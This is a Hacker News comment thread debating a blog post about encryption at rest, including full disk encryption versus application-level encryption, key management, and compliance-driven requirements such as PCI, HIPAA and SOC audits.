grant Lambda permissions to decrypt the data so that it can process it :-) Generic server-side encryption does do something: it protects against threats that exist at the data center layer, such as certain attacks through lower layers of infrastructure that don't necessarily involve a full compromise of the machines involved, or inappropriate disposal of old storage devices, mistakes by employees, etc. It protects against some insider attacks, just not those by capable administrators. reply JackSlateur 5 hours agoprevThis article is so narrow-minded .. I've work with physical servers in many compagnies. Every time, storage devices have a lifecycle : they are bought new, then plugged (and some data are written), then some times then move in another physical location, then they \"die\" (= put to the trash, either because they broke or for other reasons). Encryption at rest is an efficient way to secure data for the latter cases. The workers stole a hard disk ? No data is stolen. A hard disk is lost during transit, somehow ? No data is stolen. The device which is broken is retrieved by someone, opened-up, and being read-at directly ? No data is stolen. Your old device, put to the bin for some reasons, that could still be read if plugged on the proper hardware ? No data is stolen. All of that with little performance impact, and no software modification, few engineering overhead, very little work to do. It eases the lifecycle of storage devices, because storage devices are now worthless per-se (except for their physical cost, indeed). They carry virtually no data, no worth. Can you propose any other way to protect against those thread models ? Rewrite every software, so that every programs handle their own private keys ? Yeah, that's a nightmare, not gonna happen. And even if it did .. how would you encrypt your rootfs ? Ha yes : encryption at rest :) reply velcrovan 5 hours agoparentFrom the article: \"Disk Encryption is important for disk disposal and mitigating hardware theft, not preventing data leakage to online attackers.\" reply KennyBlanken 7 minutes agorootparent...which is a concept nearly anyone working in IT understands. I don't think the vast majority of people with IT/ops experience seriously thinks that encryption at rest provides data protection from people getting unauthorized access to the system, in person or remotely...aside from maybe management that ended up in charge of IT and engineering departments without almost any practical-skills background in either. The author is confusing \"it costs us nothing (now that encryption can be done in hardware and is integrated into most desktop operating systems) and protects in some scenarios, so yeah, we just decided to mandate it always be done\" with \"PEOPLE THINK ENCRYPTION AT REST IS A MAGIC BULLET LOOK AT ME I'M INSIGHTFUL, POST LINKS TO MY BLOG ON LINKEDIN!\" The whole post is insulting to the intelligence of even a fairly junior desktop support technician. reply CiPHPerCoder 0 minutes agorootparent> The author is confusing \"it costs us nothing (now that encryption can be done in hardware and is integrated into most desktop operating systems) and protects in some scenarios, so yeah, we just decided to mandate it always be done\" with \"PEOPLE THINK ENCRYPTION AT REST IS A MAGIC BULLET LOOK AT ME I'M INSIGHTFUL, POST LINKS TO MY BLOG ON LINKEDIN!\" What in the article gave you that impression? I do not hold this confusion in my mind, nor did I deliberately encode such a statement in my blog. I'm curious why you think this is what I was saying. > The whole post is insulting to the intelligence of even a fairly junior desktop support technician. If that was true, every time someone posts \"My Hot New Database Encryption Library in Haskell\", they would be mitigating the confused deputy attack by design, rather than what we see today: Namely, failing to even protect against padding oracle attacks. j-bos 5 hours agoparentprevComments like these are doubly great, useful tech perspectives, and a reminder that the comments often do not reflect understanding of the original submissions. reply PaulStatezny 4 hours agorootparentHa, I also love the irony of your parent comment. Seems to totally miss the point, but I still upvoted because it illuminates the purpose of disk-level encryption so well, adding color to the conversation. reply ziddoap 5 hours agoparentprev>This article is so narrow-minded .. Indeed, they said exactly that. See: >Important: I’m chiefly interested in discussing one use-case, and not focusing on other use cases. Namely, I’m focusing on encryption-at-rest in the narrow context of web applications and/or cloud services. reply l33t7332273 5 hours agorootparentIn web applications and cloud services drives could still be misplaced, stolen, or improperly disposed of. Further, if data is encrypted at rest then there are multiple levels of auth that must fail for a breach to occur, namely access to the data and access to the key. reply thelittleone 4 hours agorootparentDefinitely true and a layered defense against data loss / theft has obvious advantages. But take for instance a small SaaS running on a cloud PaaS (e.g., AWS, GCP etc). What it the likelihood of improper disposal of a hard disk? And then what is the likelihood this improperly disposed of hard disk survives the process of removal / improper disposal to then be found by someone nefarious? And then, what is the likelihood that that particular drive was in a volume that contained anything sensitive. Then what is the cost / overhead / complexity / other cons of adding encryption at rest? Cyber budgets often go crazy I see so many clients that are buying tech based on marketing hype or the security teams lusts for cool tech rather than what reduces the risk the most for the dollars available. reply JackSlateur 59 minutes agorootparentLast time I implemented encryption at rest (when I worked for a small cloud provider), it was as easy as adding an option when creating the disk. The option triggered the implementation of a dm-crypt layer between the physical device and the upper storage layers. Crypto keys were stored in the storage system. Once revoked, the whole server was rendered useless (from a data thief point of view). We benchmarked the stuff a bit. Indeed, there was a loss. While dm-crypt uses AES (with hardware acceleration) and since we had multi-hundreds of thousands IOPS per device, we did not care. reply ziddoap 5 hours agorootparentprevWhile threat modeling, you talk about specific scenarios and specific threats. That does not mean other scenarios and threats don't exist. It just means they aren't the focus of that particular conversion. >In web applications and cloud services drives could still be misplaced, stolen, or improperly disposed of. This is explicitly called out in the article by the author, despite it not being part of the threat model the author is examining. And people are still bringing it up like some sort of gotcha. See (again): >This is not a comprehensive blog post covering every possible use case or threat model relating to encryption at rest. reply l33t7332273 4 hours agorootparentI’d say the author is being so restrictive in the scope of threats that it isn’t very useful. Regardless, even in their very restrictive scenario, it provides defense in depth as I said. reply CiPHPerCoder 4 hours agorootparent> I’d say the author is being so restrictive in the scope of threats that it isn’t very useful. Loss of control of the hard disks may have many different ways it can manifest in the real world, but from a cryptography and software development perspective, is congruent to other flavors of the same underlying problem. That's not being \"restrictive\", it's recognizing the common denominator. reply Dylan16807 2 hours agorootparentThe problem is that after that common denominator is recognized, the post implies that it is outside the threat model of \"web applications and/or cloud services\", when it is not. It doesn't need in-depth discussion, and the way data is still highly exposed despite disk encryption is very important, but that implication is not great. reply KRAKRISMOTT 4 hours agoparentprevIt also defends against cultural indifference to privacy violations. If you go to Reddit r/sysadmin, most SREs and DevOps folks generally do not care too much for challenging subpoenas and government data requests. If a three letter spook shows up to their data center and demands data, it's just another Tuesday for them. IT people are very different from software engineers who are more likely to protest online and offline about civil right violations and government overreach. reply t_sawyer 36 minutes agorootparentDifferent levels of encryption at rest play different roles in your particular scenario. If you use a cloud service and they have an encryption at rest feature that you enable, the default is for them to control the key. Or, for Azure, put a \"customer controlled\" key in Key Vault. But again, that's their service. In this scenario you're only protected against people physically in the data centers not their DevOps folks. But, that feature gives you a checkmark for SOC2 or other regulations... The problem protecting against DevOps folks at a cloud is: 1. You are burdened with putting a key somewhere outside of their cloud. If you do something at the filesystem level like enable bitlocker on a VM you're going to experience pain during reboots and it's not possible on a root volume if you're not given a console. 2. You can't do this on a cloud service like RDS. You'd have to do row level encryption with your application doing the decryption/encryption. But, your application has to have the key and now your back to #1. The VM with the key needs the root disk encrypted or the drive where the key is store encrypted. And again, you're not able to use a cloud service like EKS or App Service you're stuck with VMs. Generally, I tend to just stick with regulation requirements which protect against the physical hard disk. reply victorbjorklund 4 hours agorootparentprevBut the SRE/Devops team would certainly have access to the decryption key. Seems a little bit weird to encrypt to just stop another team from doing their job. Wether data should be handed over to the govt or not should probably be a company decision and not the dev teams anyway. reply dfc 4 hours agorootparentprevSoftware engineers are more likely to care about civili rights than IT people? reply blitzar 4 hours agorootparentprevsoftware engineers who are more likely to want to harvest and process more personal data than the three letter agencies can possibly imagine reply EPWN3D 4 hours agorootparentprevYeah I've always gotten power tripping vibes from sysadmins. They're happy to fork over data just to show that they can. reply Volundr 1 hour agorootparentThis is a weird take. For one, handing over data because someone in power told you too is the exact opposite of power tripping. It's pretty much the entire description of disempowering. But secondly, the idea that anyone who actually has a say in if the data is turned over (the legal team, executives) give a flying fork about how a random sysadmin in their data center feels about it is wildly off base. The data is going out or not according to legals instructions. Either sysadmin Bob does it, or he takes a principled stand, gets fired, and Bob 2 takes care of it. reply tossandthrow 5 hours agoparentprevFor this thread model, the encryption should happen at the volume level, not application level. Which is also what the author write: >If you’re only interested in compliance requirements, you can probably just enable Full Disk Encryption and call it a day. Then, if your server’s hard drive grows legs and walks out of the data center, your users’ most sensitive data will remain confidential. > Unfortunately, for the server-side encryption at rest use case, that’s basically all that Disk Encryption protects against. (Something tells me that you did not read the article that is so narrow minded) reply JackSlateur 5 hours agorootparentI think I've written enough to illustrate that storage devices moves around without \"growing legs and walk out\" But yes, if the author drops all security thread related to encryption at rest, then encryption at rest is useless. I agree. reply CiPHPerCoder 5 hours agorootparentIt sounds to me like you read a different article than I wrote. The point of my article was not \"Encryption-At-Rest Is Bad\" as you seem to have taken it to mean. Rather, the point is that other techniques, when you sit down and actually think them through, do not provide any significant value over just phoning it in with Full Disk Encryption. How you get from \"software libraries that encrypt-at-rest routinely fail to provide value on top of full disk encryption\" to \"Scott says FDE is bad\" is unclear. Additionally: From a software perspective, the risks you all outlined are morally equivalent to the hard drives grew legs and walked because they are the same risk; namely, loss of control of the actual hard drives. The article in question is focused on threats when those drives are plugged in and the keys are being used to encrypt/decrypt data. As several others have pointed out already, I explicitly state this, repeatedly. I don't know how to make it more clear. reply tossandthrow 4 hours agorootparentprevAll the risk vectors you list yourself are about physically being able to get the disk. The author states that \"growing legs and walk out\" (understood as people being able to physical access to the disk) is already mitigated by disk encryption. So not only are you not adding anything to the article. You actively try to dismiss that the author has thought the cases you bring up through (and calling them out as narrow minded on false grounds). I think we all would love to see a risk that is mitigated by encryption at rest and is not already being mitigated by disk encryption. reply darkwater 2 hours agorootparentprevIs it that complicated to admit you misread and/or misinterpreted TFA and you posted a wrong comment? reply redleader55 4 hours agoparentprev> A hard disk is lost during transit, somehow ? No data is stolen. Arguably, customer data should not leave a secure location on a physical disk. If you want to move your server, backup the data, wipe the disk, move the server/disk/etc, and then put the data back on the disk once it is back in a secure location. The author mentions this in the article - define a secure boundary, don't let the data exit that boundary unencrypted. reply yjftsjthsd-h 4 hours agorootparent> Arguably, customer data should not leave a secure location on a physical disk. Okay, let's argue. Under what threat model is it a problem to transport sensitive data on encrypted disks? reply forty 2 hours agorootparentMaybe \"they can replace the disk firmware during transport while the driver was peeing\" kind of attackers? reply yjftsjthsd-h 2 hours agorootparentThat doesn't have anything to do with the customer's data and isn't helped by the suggestion of wiping the drives before transport. The data is encrypted no matter what happens to firmware; that is at best a way to compromise the server(s) after transport. reply brongondwana 4 hours agorootparentprevNever underestimate the bandwidth of a stationwagon loaded with tapes. Arguably, your position is bogus. Why cause a bunch of extra copying around to move a server. \"Back up\" indeed - to what? Another disk? It's turtles all the way down. reply JackSlateur 43 minutes agorootparentprevHow do you \"wipe the disk\" ? Serious question: is there a sane, working, single solution to ensure that ? Flash-based devices are so complicated (versus the old rusty devices) Anyway, this sound exhausting reply CiPHPerCoder 14 minutes agorootparentIf you're using a secure disk encryption technology, and you manage to clear the keys from the TPM or overwrite the header containing the KDF salts and other metadata, that should render the device data unrecoverable. reply yourapostasy 3 hours agoparentprev> Rewrite every software, so that every programs handle their own private keys ? Yeah, that's a nightmare, not gonna happen. PCI 4.0 disallows using Full Disk Encryption to fulfill its encryption at rest requirements, because it demands a finer-grained encryption authorization model. For applications subject to PCI 4.0 compliance, my clients have to encrypt beyond the application level, and down to the service account level used by the application (most of these applications use multiple service accounts for representing teams that use the applications), with different files encrypted for different authorization groups. There are very few enterprise scale solutions addressing this at the moment, and the stopgap I've seen is indeed the application teams are resorting to handling their own keys if the enterprise doesn't offer a finer-grained solution. The QSA's don't yet understand how seismic a shift this is, nor how inadequate the assumed authorization schema is for the many edge cases out there that will be unable to adopt the assumption a single key for a single group is sufficient to model all use cases. It will be a little messy until folks sort through the edge cases coming down the pike. reply jiveturkey 2 hours agoparentprevlaptop theft is actually far worse a problem than data center. well, not in terms of scope, but in terms of frequency at least. you can actually expect laptops to be stolen. i think you misread the article. i found it to be a great, even excellent, discussion of WHY and then explaining HOW in terms of the WHY. reply Joe8Bit 5 hours agoprevIn my experience, a lot of the motivating factors for large enterprises mandating encryption at rest aren't about specific security controls. They will often hand wave in that direction, but as as the OP says in their post, without being able to describe a coherent threat model. Instead a lot of motivating factors I've seen are about preventing various paths for \"legitimate\" data disclosure to third parties. For example, when data at rest is combined with additional requirements like \"bring your own key\" it means a subpoena or NSL needs to be served on the _first party who owns the data_ (as they need to provide the keys) and can't be served on just the cloud provider without the first party having at least visibility of it. reply cjonas 6 hours agoprevSalesforce has an addon product called \"Shield\" that cost 30-50% of your overall license cost. It allows for encryption at rest at the field level (not all fields are supported and introduces query limitations). Companies purchase this add on thinking it makes them more secure, but it essentially does nothing to protect your data from exfiltration. If Salesforce's raw, multi-tenant data stores are leaked it seems unlikely that your company is going to be the ones taking heat for it. The only reason to go through this trouble is to check the regulatory box. Also it seems like Salesforce should be encrypting the entire disk at rest. Instead they created this feature to charge a premium to those with regulatory requires and try to shift the liability. reply jwnin 6 hours agoparentMarkup aside, your description of what Salesforce is offering is what the article is saying should be done. Encryption of the disk at rest doesn't do anything for data exfil situations; it protects against physical theft or improper disposal - only. reply cjonas 5 hours agorootparentSorry, still reading so having gotten there yet. How does Salesforce offering a \"light\" version of encryption at rest improve security? Or are you saying it's a better balance of performance / security by only selectively encrypting specific data points? reply sebazzz 2 hours agorootparentIt sounds like they are using/implementing something similar to SQL Server Always Encrypted[0]. This basically works by encrypting specific fields using a certificate that needs to be supplied by the connecting SQL client (application). Obvious limitations is that you can't use the fields for sorting in queries (ORDER BY), and depending if deterministic encryption is not enabled, you can't use it in filters (WHERE) either. Same applies for any T-SQL logic on the data fields - because the encrypted blob is opaque to SQL Server - it is decrypted client-side. There is no workaround, except for pulling the data locally and sorting client-side. [0]: https://learn.microsoft.com/en-us/sql/relational-databases/s... reply CiPHPerCoder 2 hours agorootparent> Obvious limitations is that you can't use the fields for sorting in queries (ORDER BY), and depending if deterministic encryption is not enabled, you can't use it in filters (WHERE) either. Same applies for any T-SQL logic on the data fields - because the encrypted blob is opaque to SQL Server - it is decrypted client-side. There is no workaround, except for pulling the data locally and sorting client-side. This is a reasonable limitation when you're aware of the attacks on Order Revealing Encryption: https://blog.cryptographyengineering.com/2019/02/11/attack-o... reply ziddoap 5 hours agorootparentprevWhat do you mean \"light\" version of encryption? Anyways, the improved security comes from the fact that even when the server itself is improperly accessed (maliciously or not), the data you aren't currently accessing remains encrypted. With (just) full disk encryption, you aren't protected when the (running) server is accessed. All of the data can be exfiltrated in plaintext. reply cjonas 4 hours agorootparentGotcha... so basically encryption of disk at rest prevents someone from walking out with a drive... Encryption \"at rest\" in the database prevents someone with server or direct db connection from pulling the data. I had never really thought of those as two different vectors, but of course they are. Thanks for clarifying! With Salesforce and how a lot of these companies manage their security model, I'm still confident that investing in securing unauthorized user access is still orders of magnitude more useful than putting time and effort into this vector. reply ziddoap 4 hours agorootparent>I'm still confident that investing in securing unauthorized user access is still orders of magnitude more useful than putting time and effort into this vector. These are addressing two different scenarios, so they should be mitigated separately. In one case, you are mitigating against unauthorized access. In the other, you are mitigating the damage that can be done when someone has already gained unauthorized access (however that occurred). After all, the only system immune to unauthorized access is the one that doesn't get powered. \"Defense in-depth\" is thrown around a lot, but it really is important. I do agree though, when it comes to priority of implementation, I would start with protecting against unauthorized access first. reply cjonas 3 hours agorootparentI don't disagree on a conceptual level, but on a regular basis I deal with companies completely lacking any real access model, users without MFA, blanket admin level access, etc... getting sold on this particular product and something spending 7 figures to adopt it. reply kbolino 5 hours agorootparentprevIt sounds like it is in addition to full-disk encryption, not instead of it. Encrypting each field with a distinct key that an attacker cannot glean by simply exfiltrating all the data on disk and/or all the data in RAM protects against online attacks in a way that full-disk encryption cannot. The real question is: does Salesforce do this properly? reply apgwoz 4 hours agorootparentIt’s certainly possible that there’s a valid oversight here, but Salesforce has a rather talented security team, and the company truly lives by “Trust is our #1 value”^1 I can’t speak for the implementation, but my guess is that it’s been very thoroughly vetted by both internal security and external pen tests. They wouldn’t market a high profile security feature without that. (1: I am an ex-Heroku / Salesforce employee) reply sneak 3 hours agoparentprevSaaS vendors charging a big premium for customers locked in that have compliance requirements is nothing new; it’s basically a standard play in the rentseeking startup model: https://sso.tax/ reply whartung 4 hours agoprevFunny I always considered the impetus of Encryption at Rest to be the \"left my laptop in the airport scenario\". Or, maybe, \"Where'd that CD with all of the medical records go?\" Originally, I never felt that the EAR issue was that germane at data centers, since you're mostly protecting against someone backing through the loading door with a truck and stealing trays of drives. The disposal issue is valid, that was just something we were diligent with using a secure disposal service. Key management has always been an issue. Since no one wanted to be there when the machines spooled up after a glitch at 3am to type in a password to open the volumes. Everything else is basically locking the file cabinet drawers and taping the key to the back of it. Nowadays, it's different. Its more ubiquitous. Encrypting a laptop is a mouse click, and painless after that. Cloud providers have the infrastructure to manage it at their level. I'm still now sure what the solution is for a \"self hosted\" infrastructure. Hardware key modules are still pretty expensive. I haven't (not that I've looked at all recently) seen a writeup of how best to set of encryption on those 4 Dells my friend has racked across the country in Georgia (though even modern machines have some level of volume encryption I think). reply xenophonf 3 hours agoparentI keep meaning to deploy Mandos in my homelab: https://www.recompile.se/mandos reply ozim 2 hours agoprevI think reason is simple \"encryption at rest\" == \"it is going to be encrypted in backup\". People asking about \"encryption at rest\" are really asking if backups of your web application data are encrypted. Earlier I think it was quite a plague when just un-encrypted backup files were leaking out because someone exposed them on some open FTP to \"quick and dirty\" copy backups to new environment or to some test environment - and forgot to close it down or remove the files. Other threat would be developers exposing database server directly to the internet because someone from marketing wants to connect \"new shiny super business intelligence\" and developers not knowing better than \"allow all\" on firewall, then someone might steal raw db files but might not really have access to web application and encryption keys. For the reasons mentioned by author I can see how it seems like security theater. But I think my reasons are quite valid and on topic. reply CiPHPerCoder 2 hours agoparentThe thing that's security theater isn't encrypting at rest in general. The thing that's security theater is encrypting insecurely, or failing to authenticate your access patterns, such that an attacker with privileged access to your database hardware can realistically get all the plaintext records they want. reply indymike 1 hour agorootparent>> The thing that's security theater isn't encrypting at rest in general > The thing that's security theater is encrypting insecurely Security theater should be defined as: Doing things that outwardly appear to improve security but have de minimus or less effect on actual security. The 93 section questionnaire from bigco's IT department is security theater. Filling it out does zero to improve security for bigco or myco or my users. reply CiPHPerCoder 28 minutes agorootparent> Doing things that outwardly appear to improve security but have de minimus or less effect on actual security. Right. And that's exactly the situation the article describes. The accusation of \"security theater\" was only levied when IT departments reached for the \"full disk encryption\" potion to mitigate the ailment of \"attacker has active, online access to our database via SQL injection\", when that's not at all what it's designed to prevent. They can insist that they're \"encrypting their database\", but does it actually matter for the threats they're worried about? No. Thus, security theater. The same is true of insecure client-side encryption. reply OptionOfT 5 hours agoprevI'm a huge fan of MSSQL's transparent data encryption in situations where we have more than 1 client per database engine, and we want to separate the data physically. I worked on a project where separate databases (a la Postgres) tied to separate clients wasn't enough. Postgres still can read across the databases. With TDE we tie the key to the individual clients meaning even if the engine messes up, since the connection isn't made with the right key, you still can't read the contents. We still did encryption at rest as that comes for free these days, for reasons mentioned here in the comments. I just wish Postgres would come with TDE. Paying for software is fine, but the cost of MSSQL is way more than $0. In fact, it's usually cheaper to set up a Postgres instance per client. That way, when the engine messes up, well, there is only data of that client. And I know a database is unlikely to mess up. I'm more likely the culprit, and as such I prefer to have my guardrails. reply andyzweb 2 hours agoparentthere have been a few attempts at adding TDE to postgresql. I think the cybertec patches are probably the most notable https://github.com/cybertec-postgresql/postgresql/tree/15tde... reply cedws 48 minutes agoprevIn the context of cloud, it's cargo cult security. Something somewhere says \"you must have encryption at rest.\" I find it very hard to believe Amazon's or Google's servers do not already have full disk encryption. So what are you protecting again? If you're storing the decryption keys in KMS in the same cloud, you're not hiding anything from the cloud provider. The only rationale I can think of for doing this is defense-in-depth, but seeing how many companies struggle to even get IAM right I doubt this would help much. Security compliance and real world security are a universe apart. You have encryption at rest with mandated AES-GCM/SHA512? Cool story bro, some teenagers just broke into your network with a bit of social engineering and a 6 year old CVE. reply CiPHPerCoder 19 minutes agoparent> I find it very hard to believe Amazon's or Google's servers do not already have full disk encryption. I am confident that they do. Even better, they can be configured to use your KMS key rather than the service key, and you can configure KMS to use external key stores (i.e., an HSM in your datacenter outside of AWS's control, that you could theoretically pull the plug on at any time). reply snowstormsun 24 minutes agoparentprev> I find it very hard to believe Amazon's or Google's servers do not already have full disk encryption. I find that very easy to belive. reply talkingtab 4 hours agoprevThe author used the term \"unknown unknowns\". This is a variant of the way I talk about this state: \"you don't know what you don't know\". There are two audiences for this articles then, the ones who know what they don't know (or know it all), and those like me who are ignored-squared. I found it extremely helpful to help me \"know what I don't know\". If you have no idea what \"encryption at rest\" is or why it is important, then this is very useful and helpful. As the author clearly states it does not cover other things you don't know, like why and how to use full disk encryption. That said, it would be helpful for us i² [i squared] folks to have some of the more basic terms explained. Although \"encryption at rest\" is somewhat understandable, it would be pleasant to have it explained. For example what are the other kinds of encryption that are not \"at rest\"? There are a bunch of diligent amateurs out here, ones who know we don't know what we don't know and are attempting to build cryptographic things. We learn not to create our own implementations for example, but articles that specifically address us are good. [edit for clarity] reply CiPHPerCoder 4 hours agoparent> That said, it would be helpful for us i² [i squared] folks to have some of the more basic terms explained. Although \"encryption at rest\" is somewhat understandable, it would be pleasant to have it explained. That's helpful feedback, actually. What terms seemed opaque or misleading to you as you read it? I'm always happy to fix mistakes in blog posts to improve clarity. > For example what are the other kinds? I contrast \"encryption at rest\" with \"encryption in transit\" (i.e., TLS) and \"end-to-end encryption\" (E2EE for short; i.e., what Signal gives you). reply teeray 5 hours agoprevEncryption at rest is nice for when a device has to get retired. Without the key, the drive is indistinguishable from random noise. No longer do you need to run DBAN for hours, put the drive through a degausser, or drill holes in it. No worrying about plaintext data hiding due to relocated sectors or wear-leveling. Just purge the keys and you’re done. Then the drive even has a chance at getting responsibly reused. reply aftbit 3 hours agoparentYeah though SSDs make that even easier, with the aptly named SECURE ERASE command. Modern SSDs encrypt the contents of the drive at rest _anyway_ (transparently, using a key that's baked into the hardware) as encryption algorithms are very good at removing repeated patterns that might degrade the flash over time. reply fulafel 2 hours agoprev> The first question to answer when data is being encrypted is, “How are the keys being managed?” This is a very deep rabbit hole of complexity, but one good answer for a centralized service is, “Cloud-based key management service with audit logging”; i.e. AWS KMS, Google CloudKMS, etc. This is of course the beef. What's the best practice in managing user data keys so that data is available only when there's an authenticated user around? There are ways to derive keys from the secret exchange involved in user authentication. reply CiPHPerCoder 2 hours agoparent> What's the best practice in managing user data keys so that data is available only when there's an authenticated user around? What does it mean for an authenticated user to be \"around\"? If you want a human to manually approve the decryption operations of the machine, but it can still store/encrypt new records, you can use HPKE so that only the person possessing the corresponding secret key can decipher the data. At least, you can until a quantum computer is built. reply throwaway38375 6 hours agoprevThis might sound like a stupid question, but I'll ask anyway: What benefit does encryption at rest solve for something which is never intended to actually rest? For example, a MySQL database powering a web application is expected to be alive and responding to requests 24/7. It's never really intended to be at rest. So what benefit does encryption at rest bring? Won't a hacker be attempting to take data when it's online (and therefore not resting)? reply nielsole 5 hours agoparentYour RAID reports an issue with one of the disks. You disable it and have the DC staff swap it. What happens to the disk? It might be resold. It might be put into the next server. It might land in an office drawer with a label \"to be wiped\". reply throwaway38375 3 hours agorootparentGood point. reply jgalt212 5 hours agorootparentprevso funny. I look below my monitor, and there rests a hard disk with \"MUST WIPE\" post-it on it. Thanks for the reminder. reply mholt 5 hours agoparentprev> What benefit does encryption at rest solve for something which is never intended to actually rest? That's the point of the article, luckily enough. \"Disk Encryption is important for disk disposal and mitigating hardware theft, not preventing data leakage to online attackers.\" > So what benefit does encryption at rest bring? Won't a hacker be attempting to take data when it's online (and therefore not resting)? Yes (again, illustrated in the article). reply JackSlateur 5 hours agoparentprevData at rest = data persisted somewhere = anything written on your hard disk drive I am pretty sure your database stores things into /var/lib/mysql : this is what would be encrypted (without support from the software) So, if you lose your SSD, nobody is able to read your database's content reply Horffupolde 5 hours agoparentprevData is both at rest and in memory. It’s not mutually exclusive. Binary backups or images of data encrypted at rest will continue to be encrypted. reply DougBTX 5 hours agoparentprev\"At rest\" is used to contrast with \"in flight\", where the data is being transferred between computers. So data \"in flight\" is protected by HTTPS etc, once it has been transferred it is \"at rest\" on the destination computer (even if that computer is still online). reply throwaway38375 3 hours agorootparentAh, I see. Thank you for explaining. This is much clearer. reply bravetraveler 5 hours agoparentprevIntention becomes victim to reality easily, often with no input. I haven't read the post yet, but I feel like expecting a perfectly well-defined model is kind of in bad faith. Defense in depth is established, FDE is one tool among many. By focusing on the hacker we forget about the person who may get the equipment downstream; procedures/processes fail, and so on. It's preparing for the unknowns. Sounds like paranoia? That's the job! Defending against human nature - malice, forgetfulness, etc. I guess I'll close with this: you're the only one who can make your security assessment. What's important, what's at risk, and so on. It's trade-offs all the way down. reply throwaway38375 5 hours agoparentprevI should clarify that I see the value of encryption at rest for something like an employee laptop, which could be left at a bar (while powered off) by accident. I just don't get the value of it for always online servers. reply JackSlateur 5 hours agorootparentHow are online servers differents ? You can remove storage devices from online servers, without interruption. Said devices will contains data that could be \"lost\" that way. Hence: encryption at rest. reply nine_k 5 hours agorootparentprevAn intruder gains access to an API box, and could try to read sensitive data from a DB. But the interesting fields are encrypted, and the key is somewhere in RAM. Not impossible to exfiltrate, but takes much longer time and more skill, thus cannot be made an unattended malware payload. Also, a key for one customer won't give access to data of other customers, even if the common database access credentials are obtained. reply tetha 2 hours agoparentprevI've written a whitepaper about our encryption at rest at work, which includes a bit of considerations about the threats considered. The first important part is: Encryption at rest protects higher levels of the stack from access by lower levels of the stack. If your attack is working at an application level - e.g. you have a database connection - encryption at rest is no tool to deal with this. Encryption at rest is more about protecting the database from an attacker with physical access. The second consideration is: There will always be a tradeoff between availability and security when dealing with encryption at rest. Manually decrypting a system is very secure, but if that system goes offline at 3am, it'll be offline until the device is decrypted. Automatically decrypting a system using Clevis/Tang, TPM, Bitlocker and such gives you more availability but could make it possible for an attacker to access your data if they have sufficient control. And that's the third consideration: If an attacker has sufficient control, they can defeat automated decryption of encryption at rest, and they may have ways to start attacking manual decryption of encryption at rest as well. Like, you might be able to start looking at memory contents, disk writes and start doing some differential cryptoanalysis to attack encrypted data and such. But with all of these three together, you arrive at the goal and security level we have formulated for our encryption at rest: Our encryption at rest is supposed to defend us against employees of our hosters getting access to one or two of our virtual or physical storage devices. If they have access to one or two storage devices, they must not be able to access customer data on the devices. Naturally, the question is: But what happens if they have more drives? Well, the simple answer from the whitepaper is: That's a problem for the lawyers. Handling 1-2 of our drives is entirely arguable as daily business. Swapping drives via remote hands or dismissing dedicated servers with 2 drives at a specific hoster happens a lot and then they handle 1-2 drives, and our goal ensures they cannot gain access to customer data then. However, if a datacenter tech starts pulling 3 or more drives and starts analyzing data on them together, that's outside of normal operational procedures and we can start considering that an attack and start sueing them. Or they are being directed by law enforcement. Both are issues for the legal teams though. At least that's our view. Encryption at rest works in a very different set of circumstances and mindset than other security topics in a software stack. reply algernonramone 5 hours agoparentprevMy thought here is that not all of the data in the database is being accessed at the same time, so the un-accessed data is \"at rest\". Is that correct, or am I barking up the wrong tree? reply kbolino 5 hours agorootparentAssuming full-disk encryption is in use (LUKS, TrueCrypt/VeraCrypt, BitLocker, etc.), there is enough information held in RAM to decrypt the entire disk. If the attacker gains access to a privileged user, or at least to a user allowed to read the file system (such as the user running the database), they can exfiltrate the unencrypted contents of the disk, regardless of what the DB software is actively accessing. reply algernonramone 4 hours agorootparentAh, OK, makes sense. Thanks for the clarification! reply bearjaws 3 hours agoprevI wonder if OP works in healthcare, after HIPAA passed encryption at rest was the buzz word of the decade as it was one of the primary requirement of HIPAA. The problem of course being, most health care breaches are on applications that aren't at rest so all the data was being stolen anyway. From 2012-2021 I worked in health tech and on many calls with large customers and security questionnaires were on whether we were actually storing their data encrypted at rest. We even had to get audited for Aetna to validate encryption at rest (amongst other things). To me this seemed like such a joke of a requirement because all our data was in AWS, and breaches were far more likely from other avenues. So to me this reads as a jaded SWE or CISSP who has dealt with how much attention this one attack vector is paid, but ultimately it is kind of a given now in modern cloud infra. reply CiPHPerCoder 3 hours agoparent> I wonder if OP works in healthcare No, I work in applied cryptography. When I joined Amazon, the team I was hired on was called AWS Crypto Tools (which owned the AWS Encryption SDK, among other developer tools), while another team was called Transport Libraries (which owned S2N). When I left in 2023, they started adopting more of the \"Encryption At Rest\" lingo for what was previously called Crypto Tools. I don't know if they landed on different verbage since then. > after HIPAA passed encryption at rest was the buzz word of the decade as it was one of the primary requirement of HIPAA. Interesting. Thanks for sharing. reply steelframe 3 hours agorootparentIt sounds like you left pretty close to when Greg did? What precipitated that, if you don't mind my asking? reply CiPHPerCoder 3 hours agorootparentAndy Jassy decided that it was time to Return To Office. I was hired in 2019 as a fully remote employee. This means my options in 2023 were a) move to Seattle or b) walk. I chose to walk. The leadership of the Cryptography org fought tooth and nail to get an exception for me, but were unable to do so. I still hold everyone in AWS Cryptography in high regard. reply nightpool 4 hours agoprevEncryption at rest is something your cloud provider does to pass SOC audits. End of sentence. If you have stronger security concerns, then you need to turn to other tools in your toolbox. reply ziddoap 4 hours agoparentEncryption at rest has several valid use-cases beyond SOC audits. End of sentence. Edit: Since this has gotten some negative votes, I'll happily expand. The two primary examples of FDE that are real-world useful (i.e. not just checking boxes) is loss of physical control of a device and cryptographic erasure (at device end-of-life). Neither of these use-cases in relevant to the threat model the article is discussing, but it's ridiculous to say that FDE is only for SOC. reply nightpool 13 minutes agorootparentThis is why I said \"your cloud provider\". If you're handling your own physical devices, yes, YMMV. (For example, FDE on company laptops should obviously be non-negotiable). But expecting it to do anything else is just magical thinking. reply candiddevmike 6 hours agoprevThis blog post is a lot of words to say encryption != authentication. reply dopylitty 2 hours agoparentIn a way when people talk about encryption what they really mean is authorization to access data. The actual facts of whether or not data are encrypted using some whiz bang algorithm are irrelevant as long as some intermediary is ensuring that the data are only accessible by the intended clients. Sometimes I wonder if all the focus on encryption is actually wasting cycles that could be spent instead making sure the authorization model is bulletproof. For instance if a DBMS could ensure that only client A can access client A's data then does it matter if the data are stored encrypted in the DB? You might say, well if they aren't encrypted then anyone with root can just read the data directly but it may be the case that anyone with root will be able to access the data regardless of whether it's encrypted because they can just pull it from the memory space of the DB engine. There are a lot of considerations but it does seem like people get caught up in the \"how\" of encryption because of all the fancy maths and cool sounding algorithms rather than focusing on the \"what\" they're actually trying to accomplish which is usually \"prevent clients from accessing data they shouldn't be able to access\". reply photochemsyn 4 